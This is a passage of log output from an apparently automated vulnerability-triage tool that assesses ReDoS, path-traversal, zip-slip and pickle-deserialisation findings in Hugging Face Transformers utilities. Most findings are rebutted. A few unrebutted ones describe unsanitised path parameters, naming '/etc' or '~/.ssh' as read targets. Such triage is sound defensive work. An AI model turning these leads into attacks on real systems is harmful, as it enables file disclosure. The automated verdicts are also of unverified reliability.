+input. The simulated web endpoint in the annotation is not part of the actual 
+library; the code is a test utility for internal use. Therefore, no practical 
+ReDoS exploitation is possible.
+    Evidence: redos-139...
+      3 assumptions (3 violable)
+    Evidence: redos-142...
+      4 assumptions (3 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: redos-138...
+    ? pattern matched (3 match(es))
+  [145/207] redos-144 (get_jobs_to_run)
+    x rebutted
+      reason: The reported ReDoS vulnerability is not exploitable. The regular 
+expression in `clean_code` (line: `re.sub("#.*$", "", line)`) is a fixed, 
+hardcoded pattern that does not contain any nested quantifiers or overlapping 
+alternations. Its evaluation complexity is linear O(n) relative to input length,
+making catastrophic backtracking impossible. Furthermore, the pattern is not 
+attacker-controlled; it is static. The data flow shows that `clean_code` 
+receives file contents read from disk (via `open(folder / filename, "r")`), not 
+arbitrary user input. Even if an attacker could influence file content (e.g., 
+through a malicious pull request), the regex itself is safe. The system 
+wrapper's annotation suggesting untrusted user input is a simulation; the actual
+call chain in the library does not expose `clean_code` to direct external input.
+Therefore, no ReDoS risk exists.
+    Evidence: redos-138...
+    ? pattern matched (3 match(es))
+  [146/207] redos-145 (preserve_case_replace)
+      5 assumptions (4 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: redos-140...
+    ? pattern matched (1 match(es))
+  [147/207] redos-146 (get_lowercase_name)
+    ? 9/10 — interesting
+    Assumptions: redos-143...
+    ? 10/10 — interesting
+    Assumptions: redos-144...
+    x rebutted
+      reason: The finding claims a ReDoS vulnerability caused by 
+attacker-controlled regex patterns with nested quantifiers. However, the 
+provided source code shows that all regex patterns used 
+(`_re_single_line_relative_imports`, `_re_multi_line_relative_imports`, etc.) 
+are hardcoded constants, not user-supplied. The attacker only controls the input
+string (file content) via `module_fname`, but the regex patterns themselves are 
+fixed. Without access to the actual pattern definitions, there is no evidence 
+that they contain nested quantifiers or other constructs prone to catastrophic 
+backtracking. The `BridgeVerifier` analysis did not produce the patterns, and 
+the LLM was unavailable, leaving the claim unsubstantiated. ReDoS with fixed 
+regex is possible in theory, but the finding provides no specific pattern 
+evidence, and the code's context (parsing Python imports) typically uses simple,
+linear-time patterns. Therefore, the vulnerability is not authentically 
+exploitable based on the provided evidence.
+    Evidence: redos-140...
+    ? pattern matched (3 match(es))
+  [148/207] redos-147 (_replace_name)
+      5 assumptions (4 violable)
+    Evidence: redos-144...
+    ? pattern matched (5 match(es))
+  [149/207] redos-148 (leave_ImportFrom)
+    ✓ 0/10 - safe
+    Assumptions: redos-146...
+      9 assumptions (9 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: redos-143...
+    ? 10/10 — interesting
+    Assumptions: redos-145...
+    x rebutted
+      reason: The reported ReDoS vulnerability is not exploitable. The entry 
+point `sort_auto_mapping` expects a filename (`fname`) and reads the file from 
+disk. There is no attacker control over the file content or the regex patterns —
+`_re_intro_mapping` and `_re_identifier` are static compiled regexes defined 
+elsewhere, not influenced by user input. The simulated wrapper in the annotation
+is not part of the actual library; the real code path (call chain) shows the 
+function is used in developer utilities (e.g., `run_ruff_and_sort`, `main` in 
+`scan_skipped_tests.py`) that operate on local source files, not on arbitrary 
+attacker-supplied strings. Even if a regex were vulnerable, the absence of 
+untrusted input reaching the sink means the attack surface is effectively zero. 
+Therefore, the finding is not authentically exploitable.
+    Evidence: redos-143...
+    ? 9/10 — interesting
+    Assumptions: redos-147...
+    ? pattern matched (1 match(es))
+  [150/207] redos-149 (update_body)
+      no assumptions extracted
+    Evidence: redos-146...
+    ✓ 3/10 - safe
+    Assumptions: redos-148...
+      1 assumptions (0 violable)
+    Evidence: redos-145...
+    ? pattern matched (4 match(es))
+  [151/207] redos-150 (update_body)
+    ? pattern matched (3 match(es))
+  [152/207] redos-151 (leave_ImportFrom)
+    ? 10/10 — interesting
+    Assumptions: redos-149...
+      3 assumptions (3 violable)
+    Evidence: redos-147...
+    ? pattern matched (1 match(es))
+  [153/207] redos-152 (_load_optimizer_and_scheduler)
+      1 assumptions (1 violable)
+    Evidence: redos-148...
+      4 assumptions (4 violable)
+    Evidence: redos-149...
+    ? pattern matched (4 match(es))
+  [154/207] redos-153 (load_worker_records)
+    ? 10/10 — interesting
+    Assumptions: redos-150...
+    ✓ 2/10 - safe
+    Assumptions: redos-151...
+    ? pattern matched (1 match(es))
+  [155/207] redos-154 (__init__)
+      1 assumptions (1 violable)
+    Evidence: redos-151...
+    No code-level evidence patterns.
+  [156/207] redos-155 (__init__)
+      4 assumptions (4 violable)
+    Evidence: redos-150...
+    No code-level evidence patterns.
+  [157/207] redos-156 (__init__)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: redos-152...
+    ? 9/10 — interesting
+    Assumptions: redos-153...
+    ? 10/10 — interesting
+    Assumptions: redos-154...
+    ? 9/10 — interesting
+    Assumptions: redos-155...
+      3 assumptions (3 violable)
+    Evidence: redos-153...
+      5 assumptions (5 violable)
+    Adversary: redos-152...
+    ? 10/10 — interesting
+    Assumptions: redos-156...
+    ? pattern matched (1 match(es))
+  [158/207] redos-157 (__init__)
+    x rebutted
+      reason: The finding claims a ReDoS vulnerability, but the actual code path
+does not contain any regex operations (e.g., `re.match`, `re.search`, 
+`re.compile`, `fnmatch.translate`, `glob`) on user-controlled input. The sink 
+function `_load_optimizer_and_scheduler` performs file I/O (line 3587 of 
+`trainer.py`) and does no pattern matching. All intermediate functions perform 
+non-regex tasks: logging, Jinja template compilation (`_compile_jinja_template` 
+at line 420), model weight loading (`torch.load`), and quantization setup. No 
+regex engine is invoked, so catastrophic backtracking is impossible. The taint 
+path is irrelevant because the sink does not evaluate any regular expression 
+against attacker-controlled data. Therefore, ReDoS is not feasible.
+    Evidence: redos-152...
+    No code-level evidence patterns.
+  [159/207] redos-158 (__call__)
+      3 assumptions (3 violable)
+    Evidence: redos-154...
+    No code-level evidence patterns.
+  [160/207] redos-159 (__call__)
+      1 assumptions (1 violable)
+    Evidence: redos-156...
+    No code-level evidence patterns.
+  [161/207] redos-160 (forward)
+      7 assumptions (7 violable)
+    Evidence: redos-155...
+    No code-level evidence patterns.
+  [162/207] redos-161 (forward)
+    ? 10/10 — interesting
+    Assumptions: redos-158...
+    ? 10/10 — interesting
+    Assumptions: redos-159...
+    ? 10/10 — interesting
+    Assumptions: redos-157...
+      no assumptions extracted
+    Evidence: redos-159...
+    No code-level evidence patterns.
+  [163/207] redos-162 (__call__)
+    ? 10/10 — interesting
+    Assumptions: redos-160...
+    ✓ 1/10 - safe
+    Assumptions: redos-161...
+      no assumptions extracted
+    Evidence: redos-158...
+    No code-level evidence patterns.
+  [164/207] suspicious-163 (get_tiny_model_summary_from_hub)
+      no assumptions extracted
+    Evidence: redos-160...
+    No code-level evidence patterns.
+  [165/207] suspicious-164 (update_version_in_examples)
+      5 assumptions (5 violable)
+    Evidence: redos-157...
+    No code-level evidence patterns.
+  [166/207] suspicious-165 (update_metadata)
+      5 assumptions (5 violable)
+    Evidence: redos-161...
+    No code-level evidence patterns.
+  [167/207] suspicious-166 (process_artifacts)
+    ? 10/10 — interesting
+    Assumptions: redos-162...
+    ? 10/10 — interesting
+    Assumptions: suspicious-163...
+    ? 6/10 — interesting
+    Assumptions: suspicious-164...
+      1 assumptions (1 violable)
+    Evidence: redos-162...
+    No code-level evidence patterns.
+  [168/207] suspicious-167 (main)
+    ? 10/10 — interesting
+    Assumptions: suspicious-165...
+      no assumptions extracted
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-163...
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-164...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-167...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-166...
+    x rebutted
+      reason: The finding is not authentically exploitable. The function 
+`get_tiny_model_summary_from_hub` (line 69 in the snippet) takes **no 
+parameters**. The static annotation confirms 'no identifiable parameters'. There
+is no mechanism for an attacker to control any part of the path operation. The 
+`output_path` variable used in `os.path.join(output_path, 
+"hub_tiny_model_summary.json")` is not defined in the provided code; it must be 
+a module-level constant or configuration variable, not user-controllable. Even 
+if the function is a public API, it cannot be reached with untrusted input 
+because it accepts no arguments. The pattern-based detection flagged 
+`os.path.join` without verifying that any untrusted data flows into it. 
+Additionally, the function is a utility script for internal model updates, not 
+exposed to external callers in a realistic deployment. Therefore, the 
+vulnerability claim is unfounded.
+    Evidence: suspicious-163...
+    No code-level evidence patterns.
+  [169/207] suspicious-168 (retrieve_artifact)
+    x rebutted
+      reason: The finding flags `update_version_in_examples` based on the 
+presence of `os.path.join` in a file iteration loop, but the path components 
+(`folder`, `fname`) are derived from `os.walk` on a hardcoded constant 
+`PATH_TO_EXAMPLES`. No attacker-controlled input influences which files are 
+walked or which filenames are used. The only parameters (`version` and `patch`) 
+are used in content updates via `update_version_in_file`, not in path 
+construction. Therefore, there is no path traversal, DoS, or any other 
+exploitable vulnerability. The static data flow annotations correctly note that 
+variable propagation could not be traced, but manual code inspection confirms 
+zero untrusted data reaches the sink. Additionally, the function is not a public
+API that accepts arbitrary user input; it is an internal library helper with no 
+reachable attack surface.
+    Evidence: suspicious-164...
+    No code-level evidence patterns.
+  [170/207] suspicious-169 (get_test_module)
+      5 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-165...
+      3 assumptions (3 violable)
+    Adversary: suspicious-167...
+    x rebutted
+      reason: The finding is not exploitable. The `update_metadata` function is 
+an internal utility used for updating metadata on the Hugging Face Hub. It 
+requires a valid write token (`token`), which is a secret and not 
+attacker-controllable. The only other parameter (`commit_sha`) is not used in 
+any path construction or dangerous operation. All paths are constructed from 
+`tempfile.TemporaryDirectory()` and constant filenames (`"frameworks.json"`, 
+`"pipeline_tags.json"`), so there is no attacker-controlled input flowing into 
+any path-constructor or file operation. The simulated wrapper in the annotation 
+header is not part of the actual library; the library does not expose an 
+endpoint that passes arbitrary user input to this function. Therefore, there is 
+no realistic attack path.
+    Evidence: suspicious-165...
+    No code-level evidence patterns.
+  [171/207] suspicious-170 (get_list_of_repo_model_paths)
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-166...
+    ? 10/10 — interesting
+    Assumptions: suspicious-168...
+    not rebutted
+      weak point: Path traversal via user-controlled --output_dir and 
+--test_method_name with no sanitization, allowing arbitrary file write. The 
+developer acknowledges the danger but does not implement validation.
+    PoC Agent: suspicious-167...
+  [172/207] suspicious-171 (get_module_dependencies)
+Slice suspicious-167 failed: '"success"'
+    Error: suspicious-167: '"success"'
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-169...
+    x rebutted
+      reason: The finding is not exploitable. The sink `os.path.join` constructs
+a path using `key` derived from `item['path']` via `os.path.basename` and 
+`os.path.splitext`, which strip any directory components. Consequently, an 
+attacker cannot perform path traversal to escape the 'test_preparation' 
+directory. The only risk is if `input_file` itself is attacker-controlled, but 
+that is not the sink highlighted, and the finding focuses on path-constructor 
+functions. No DoS, infinite loop, or zip slip is present. Therefore, the 
+vulnerability is not authentically exploitable.
+    Evidence: suspicious-166...
+    No code-level evidence patterns.
+  [173/207] suspicious-172 (filter_tests)
+      1 assumptions (1 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-168...
+    ? 6/10 — interesting
+    Assumptions: suspicious-170...
+    not rebutted
+      weak point: The function `retrieve_artifact` takes a `name` parameter that
+is used directly in `os.path.exists`, `os.listdir`, and `os.path.join` without 
+any sanitization or validation. An attacker controlling this parameter can 
+specify arbitrary directory paths (e.g., '/etc', '/home/user/.ssh') to read the 
+contents of files within those directories. This is a classic path traversal 
+vulnerability leading to information disclosure. No input validation is present,
+and the function is a public API callable from external code, so exploitation is
+practical if the library is used in a context where user input reaches this 
+function.
+    PoC Agent: suspicious-168...
+  [174/207] suspicious-173 (create_test_list_from_filter)
+Slice suspicious-168 failed: '"success"'
+    Error: suspicious-168: '"success"'
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-172...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-171...
+      4 assumptions (4 violable)
+    Adversary: suspicious-169...
+    x rebutted
+      reason: The finding's exploitability hinges entirely on a simulated web 
+endpoint (`handle_request`) that passes attacker-controlled input to 
+`get_test_module`. This wrapper is not part of the actual library source code 
+(Hugging Face Transformers). The real `get_test_module` is an internal utility 
+used exclusively within the test infrastructure, where `test_file` originates 
+from controlled test configuration, not from untrusted user input. No actual 
+call chain from an external attacker to this function exists. The red-flag rules
+require extreme skepticism when the reachability is based on a hypothetical 
+external API; here, there is no realistic execution scenario where an attacker 
+can control the parameter. Therefore, the vulnerability is not authentically 
+exploitable.
+    Evidence: suspicious-169...
+    No code-level evidence patterns.
+  [175/207] suspicious-174 (sort_all_auto_mappings)
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-172...
+      6 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-170...
+      6 assumptions (6 violable)
+    Adversary: suspicious-171...
+    x rebutted
+      reason: The finding is not exploitable because the library code does not 
+accept attacker-controlled input. The `get_list_of_repo_model_paths` function 
+(line 159) uses a hardcoded `models_dir` obtained from `PATH_TO_REPO / 
+"src/transformers/models"` (line 178), which is a static path internal to the 
+project. The simulated POST endpoint in the [SYSTEM WRAPPER] is a hypothetical 
+scenario not present in the actual library; the real code has no route or 
+handler that exposes this functionality to an external attacker. No untrusted 
+data flows into `os.path.join`, `glob.glob`, or any other sink. The data flow 
+annotations note that static analysis could not trace variable propagation, but 
+manual inspection confirms no user input reaches the sinks. Therefore, this 
+finding is invalid.
+    Evidence: suspicious-170...
+    No code-level evidence patterns.
+  [176/207] suspicious-175 (model_failures)
+    x rebutted
+      reason: The finding is rebutted because the attacker-controlled input 
+scenario is artificial. In the actual source code, `get_module_dependencies` is 
+called internally with filenames derived from filesystem globbing 
+(`PATH_TO_TRANSFORMERS.glob("**/*.py")`) and other internal lists, not from any 
+external or user-supplied parameter. There is no web endpoint or API that passes
+untrusted data to this function within the provided codebase. The simulated 
+wrapper in the finding is not part of the real implementation. Therefore, path 
+traversal is not exploitable.
+    Evidence: suspicious-171...
+    No code-level evidence patterns.
+  [177/207] suspicious-176 (payload)
+    ? 10/10 — interesting
+    Assumptions: suspicious-174...
+    x rebutted
+      reason: The finding claims that `filter_tests` is a public API reachable 
+from external attacker-controlled input, but this is not supported by the actual
+library code. The function is an internal utility in the Hugging Face 
+Transformers test infrastructure (utils/tests_fetcher.py). There is no evidence 
+that it is exposed to untrusted users over a network endpoint. The simulated 
+wrapper is artificial and does not correspond to a real deployment. Even if an 
+attacker could call `filter_tests`, the only potential vulnerability is an 
+IndexError when a path has no directory separator (line 
+`f.split(os.path.sep)[1]`), which would cause a crash. However, no realistic 
+execution scenario exists where an external attacker can control the 
+`output_file` or `filters` parameters. The red-flag rule for `[REACHABILITY: 
+EXTERNAL_API]` applies: the path was detected by body presence of 
+`os.path.join`, not by a project-internal call chain, and we cannot derive a 
+feasible exploit scenario. Therefore, the finding is not authentically 
+exploitable.
+    Evidence: suspicious-172...
+    No code-level evidence patterns.
+  [178/207] suspicious-177 (retrieve_artifact)
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: suspicious-173...
+      4 assumptions (4 violable)
+    Evidence: suspicious-174...
+    No code-level evidence patterns.
+  [179/207] suspicious-178 (download_artifact)
+    ? 9/10 — interesting
+    Assumptions: suspicious-175...
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 2 consumer
+    Adversary: suspicious-173...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-176...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-177...
+    x rebutted
+      reason: The finding is not exploitable. The simulated web endpoint that 
+calls `create_test_list_from_filter(untrusted_user_input)` is an artificial 
+wrapper not present in the actual library. The real entry point is 
+`infer_tests_to_run` (line 953), which is called internally by CI scripts with 
+hardcoded or controlled parameters. All file paths in 
+`create_test_list_from_filter` are derived from a fixed `out_path` 
+("test_preparation/") and a hardcoded dictionary `JOB_TO_TEST_FILE`, with no 
+user-controlled input. The `output_file` argument in `infer_tests_to_run` is 
+used only to write a doctest_list.txt via `Path(output_file).parent`, which is a
+fixed directory. There is no path traversal or uncontrolled file write because 
+no attacker can influence the file names or base paths. Therefore, the 
+vulnerability does not exist in a realistic threat model.
+    Evidence: suspicious-173...
+    No code-level evidence patterns.
+  [180/207] suspicious-179 (get_all_errors)
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-176...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-178...
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-177...
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-175...
+    x rebutted
+      reason: The function `payload` in 
+`/tmp/transformers_src/utils/notification_service.py:559` does not accept any 
+parameters from untrusted user input. All data it uses comes from instance 
+attributes (e.g., `self.header`, `self.model_failures`), environment variables 
+(`GITHUB_EVENT_NAME`, `TRANSFORMERS_CI_RESULTS_UPLOAD_TOKEN`), and internal 
+iterables (`self.prev_ci_artifacts`, `self.other_ci_artifacts`). There is no 
+mechanism for an external attacker to control these values, as the function is 
+only invoked within a CI pipeline (GitHub Actions) where the inputs are derived 
+from CI artifacts and workflow configurations, not from user-supplied data. The 
+simulated wrapper (`@app.post`) is artificial and not part of the actual 
+library; the real code is a library internal to the Transformers CI system, not 
+a publicly reachable endpoint. Consequently, the dangerous APIs (`open`, 
+`json.dump`, `os.path.join`) are never reachable with attacker-controlled input.
+Additionally, the file paths are constructed with `os.getcwd()` and a fixed 
+`job_name` (likely from environment), and the only variable component 
+`prev_workflow_run_id` is taken from CI artifacts that an attacker cannot 
+influence. Therefore, no path traversal, DoS, or other vulnerability is 
+exploitable. The finding is rebutted.
+    Evidence: suspicious-176...
+    No code-level evidence patterns.
+  [181/207] suspicious-180 (run_converter)
+    not rebutted
+      weak point: The function's signature is not provided, but the code snippet
+shows no validation on artifact_path. The annotation claims it is a public API, 
+making attacker control plausible. However, without explicit verification of the
+parameter source and access controls, the exploitation is uncertain.
+    PoC Agent: suspicious-177...
+  [182/207] suspicious-181 (get_last_daily_ci_reports)
+Slice suspicious-177 failed: '"success"'
+    Error: suspicious-177: '"success"'
+    x rebutted
+      reason: The untrusted parameter `model_category_dict` (the only entry 
+point parameter marked as attacker-controlled) is never used in any path 
+construction or file write operation. The file paths are built from 
+`os.getcwd()` and fixed strings like 
+`f"ci_results_{job_name}/model_failures_report.txt"`, where `job_name` is a 
+class attribute, not derived from the untrusted input. There is no data flow 
+from attacker-controlled data to the sink (e.g., `os.path.join`, `open`). 
+Additionally, the finding is marked as `[REACHABILITY: BODY_ONLY]`, meaning no 
+internal call chain was identified; the function may be a library API, but even 
+then the dangerous operations are not influenced by the untrusted parameter. 
+Therefore, the vulnerability is not exploitable.
+    Evidence: suspicious-175...
+    No code-level evidence patterns.
+  [183/207] suspicious-182 (extract_warnings_from_single_artifact)
+      2 assumptions (2 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: suspicious-178...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-179...
+    x rebutted
+      reason: The finding is based on a simulated web endpoint that does not 
+exist in the actual codebase. The provided source code is from internal CI 
+utility functions (`download_artifact`, `get_last_daily_ci_artifacts`, 
+`get_last_daily_ci_reports`) in Hugging Face Transformers. These functions are 
+never exposed to external user input; they are invoked by internal scripts that 
+control all parameters (e.g., `artifact_url` comes from GitHub API responses, 
+not from an attacker). There is no path for an attacker to reach the sink 
+functions or control `artifact_url`, `artifact_name`, or `output_dir`. 
+Therefore, any potential vulnerability (path traversal, zip slip, DoS) is not 
+exploitable in practice.
+    Evidence: suspicious-178...
+    No code-level evidence patterns.
+  [184/207] suspicious-183 (_tune_save_checkpoint)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-181...
+      2 assumptions (2 violable)
+    Adversary: suspicious-179...
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: suspicious-180...
+    x rebutted
+      reason: The finding assumes an attacker can control the `artifact_dir` 
+parameter, but the source code shows `get_all_errors` is a library-internal 
+utility function (part of `utils/get_ci_error_statistics.py`). There is no 
+evidence in the provided code (or in the real Hugging Face Transformers 
+codebase) that this function is exposed to untrusted user input. The 
+`[REACHABILITY: EXTERNAL_API]` annotation is a static analysis false positive — 
+the function is not a public API intended for external callers with 
+attacker-controlled parameters. In practice, `artifact_dir` would be a hardcoded
+or internally trusted path (e.g., CI artifact storage). Even if an attacker 
+could somehow influence this path, the required write access for the TOCTOU 
+attack is extremely improbable in a CI environment. Therefore, the reported 
+vulnerability is not realistically exploitable.
+    Evidence: suspicious-179...
+    No code-level evidence patterns.
+  [185/207] suspicious-184 (_load_optimizer_and_scheduler)
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: suspicious-182...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-183...
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-180...
+      3 assumptions (3 violable)
+    path bridge: 1 builder + 3 consumer
+    Adversary: suspicious-181...
+    x rebutted
+      reason: The finding is not exploitable. The function 
+`get_last_daily_ci_reports` is an internal utility (likely used in CI scripts) 
+and is not exposed to untrusted user input in any realistic deployment. The 
+simulated endpoint wrapper is artificial and does not reflect actual usage. The 
+parameters (`output_dir`, `token`, etc.) are controlled by the system, not by an
+attacker. While `zipfile.extractall` is vulnerable to zip slip, the zip files 
+originate from GitHub Actions artifacts, which an attacker would need write 
+access to the repository's CI pipeline to inject malicious content—this is not a
+regular web-facing attack surface. Therefore, the reported vulnerability class 
+(path traversal / zip slip) is not practically reachable from untrusted input.
+    Evidence: suspicious-181...
+    No code-level evidence patterns.
+  [186/207] suspicious-185 (train)
+      3 assumptions (3 violable)
+    Adversary: suspicious-183...
+      5 assumptions (5 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: suspicious-182...
+    not rebutted
+      weak point: The code does not sanitize the 'modular_file' parameter, 
+allowing an attacker to set it to an arbitrary directory path. This enables path
+traversal: the application will list that directory and open any .py file (not 
+starting with 'modular_') to read its content. Although the content is not 
+directly returned, the act of opening and reading files from attacker-controlled
+paths is a security concern. The vulnerability is exploitable with limited 
+impact (blind read of Python files), but it is authentically a path traversal 
+issue.
+    PoC Agent: suspicious-180...
+  [187/207] suspicious-186 (_get_output_dir)
+Slice suspicious-180 failed: '"success"'
+    Error: suspicious-180: '"success"'
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-184...
+    x rebutted
+      reason: The finding relies on unverified claims about the internal call 
+chain (load_orig_state_dict calling torch.load) without providing actual source 
+code. The supplied source code annotations show a different sink 
+(self.lr_scheduler) and a fragmented call graph that does not support the 
+claimed data flow. Moreover, convert_model is a conversion utility not typically
+exposed to untrusted external input; there is no evidence that an attacker can 
+control model_name_or_path in a realistic deployment. The logical jump between 
+convert_model and torch.load is unsupported. Therefore, the finding is not 
+authentically exploitable.
+    Evidence: suspicious-183...
+    No code-level evidence patterns.
+  [188/207] suspicious-187 (_save_checkpoint)
+    x rebutted
+      reason: The finding flags `os.path.join` usage in `extract_warnings` and 
+`extract_warnings_from_single_artifact` as suspicious due to untrusted input 
+(the artifact path). However, the code strictly restricts which files are read: 
+only a file named exactly `"warnings.txt"` is processed (line 33 and 45). In the
+zip branch, `z.open(filename)` is called only if `filename == "warnings.txt"`, 
+which prevents Zip Slip (path traversal via malicious zip entries) because any 
+entry with `../` would not match the literal string. In the directory branch, 
+`os.listdir` returns basenames, and `os.path.join(artifact_path, filename)` is 
+safe because the attacker controls only the base path, not the filename 
+component. The only attacker-controlled data is the artifact path itself, which 
+determines *which* zip or directory is read, not *what* file inside it. Even if 
+`artifact_path` points to a malicious zip, only `warnings.txt` is read; there is
+no arbitrary file read, write, or other exploitable behavior. No infinite loop 
+or logic error is present. Therefore, the reported vulnerability is not 
+authentically exploitable.
+    Evidence: suspicious-182...
+    No code-level evidence patterns.
+  [189/207] suspicious-188 (_save_rng_state)
+      4 assumptions (4 violable)
+    Adversary: suspicious-184...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-185...
+    x rebutted
+      reason: The finding fabricates a data-flow chain that does not exist in 
+the actual source code. The taint path jumps from chat-template utilities 
+(`_cached_compile_jinja_template`, `apply_chat_template`) to `convert_model` 
+without any explanation of how an attacker-controlled input reaches 
+`model_name_or_path`. The simulated web endpoint in the "SYSTEM WRAPPER" is not 
+part of the library; `convert_model` is a utility function intended for offline 
+model conversion, not exposed to untrusted user input. The provided source 
+snippets do not include the implementation of `load_orig_state_dict` or the 
+actual `torch.load` call, and there is no evidence that the function is 
+reachable from an attacker. Therefore, the RCE claim is unsupported and not 
+exploitable.
+    Evidence: suspicious-184...
+    No code-level evidence patterns.
+  [190/207] suspicious-189 (_save_optimizer_and_scheduler)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-186...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-187...
+      7 assumptions (6 violable)
+    Adversary: suspicious-185...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-188...
+    x rebutted
+      reason: The finding claims an RCE vulnerability via insecure pickle 
+deserialization in `convert_ovis2_weights_to_hf.py`, but the analysis rests on 
+an artificial scenario. The `convert_model` function is a utility for offline 
+model conversion, not a remote-facing endpoint. The simulated web wrapper 
+(`@app.post("/api/v1/trigger")`) is not part of the real codebase; it was 
+injected for analysis purposes. In actual usage, `model_name_or_path` is 
+provided by the user running the conversion script—a local, trusted context. 
+There is no evidence that this function is invoked with attacker-controlled 
+input in the library's intended deployment (e.g., Hugging Face Transformers). 
+The structured evidence's taint path is not supported by the provided source 
+code snippets, which lack the actual bodies of `convert_model` and 
+`load_orig_state_dict`. Without a verifiable data flow from an untrusted source 
+to `torch.load`, the claim of exploitable RCE is unfounded. The empty developer 
+intent is irrelevant to exploitability. Therefore, the finding is rebutted.
+    Evidence: suspicious-185...
+    No code-level evidence patterns.
+  [191/207] suspicious-190 (_load_optimizer_and_scheduler)
+      4 assumptions (4 violable)
+    Adversary: suspicious-188...
+      4 assumptions (4 violable)
+    Adversary: suspicious-187...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-189...
+      5 assumptions (5 violable)
+    Adversary: suspicious-186...
+    x rebutted
+      reason: The provided source code snippet does not contain the actual body 
+of `convert_model` or `load_orig_state_dict` from 
+`convert_ovis2_weights_to_hf.py`. The call chain shown includes many unrelated 
+functions (e.g., `__init__`, `_cached_compile_jinja_template`, 
+`apply_chat_template`, etc.) which appear to be concatenated from different 
+files, not a coherent trace of data flow. Without the actual implementation, it 
+is impossible to verify that `model_name_or_path` is indeed passed to 
+`torch.load` without validation. Additionally, the simulated web wrapper is 
+artificial; the library's `convert_model` function is typically invoked by 
+developers during model conversion, not exposed to external user input. The 
+finding fails to demonstrate a realistic attacker-controlled scenario. 
+Therefore, the claim of RCE via pickle deserialization is not substantiated and 
+should be rebutted.
+    Evidence: suspicious-188...
+    No code-level evidence patterns.
+  [192/207] suspicious-191 (create_model_card)
+    x rebutted
+      reason: The finding is based on an artificial deployment scenario that is 
+not representative of the actual code's intended use. The 
+`convert_ovis2_weights_to_hf.py` script is a command-line utility for converting
+model weights, not a network-accessible endpoint. There is no realistic path by 
+which an external attacker can supply an untrusted `model_name_or_path` to 
+`convert_model`. The system wrapper simulating a web endpoint is a hypothetical 
+construct, not part of the library. Even if `torch.load` uses pickle, the sink 
+is only reachable via local file access, which requires the attacker to already 
+have write or control over the file system. This is a known risk in ML model 
+loading but is not exploitable remotely in this context. Therefore, the finding 
+does not represent an authentic, exploitable vulnerability.
+    Evidence: suspicious-187...
+    No code-level evidence patterns.
+  [193/207] suspicious-192 (_push_from_checkpoint)
+    x rebutted
+      reason: The finding relies on a simulated web endpoint that is not part of
+the actual library. The library's `convert_model` function is a developer 
+utility for offline model conversion and is not exposed to attacker-controlled 
+input in any realistic deployment. The taint path traced from `__init__` to 
+`torch.load` is based on a synthetic wrapper (the `[SYSTEM WRAPPER]` block) and 
+does not reflect the library's actual data flow. Without a real entry point that
+receives untrusted data (e.g., a web API, CLI accepting user input, or a file 
+upload endpoint), the pickle deserialization sink is unreachable by an attacker.
+Additionally, the source code fragments provided are incomplete and inconsistent
+– e.g., the `__init__` shown belongs to `modular_model_detector.py`, not the 
+model conversion module. Therefore, the reported vulnerability is not 
+authentically exploitable.
+    Evidence: suspicious-186...
+    No code-level evidence patterns.
+  [194/207] suspicious-193 (dump_worker_records)
+      1 assumptions (1 violable)
+    Adversary: suspicious-189...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-190...
+    x rebutted
+      reason: The finding claims RCE via insecure pickle deserialization in 
+`convert_ovis2_weights_to_hf.py`, but the provided source code does not contain 
+the actual implementation of `convert_model` or `load_orig_state_dict`. The 
+snippet is a jumble of unrelated call chains from different modules 
+(chat_template_utils, tokenization_mistral_common, quantizer_vptq, trainer.py) 
+and does not show the critical `torch.load` call. The data flow annotations 
+admit that the static engine could not trace variable propagation and that the 
+entry point `__init__` has no identifiable parameters, contradicting the clear 
+taint path asserted in the structured evidence. Without the actual source code 
+of the vulnerable functions, the exploitability claim is unsubstantiated. 
+Moreover, the simulated web endpoint wrapper is not part of the library; the 
+real use of `convert_ovis2_weights_to_hf.py` is likely a conversion script, 
+making remote exploitation implausible without additional context (e.g., social 
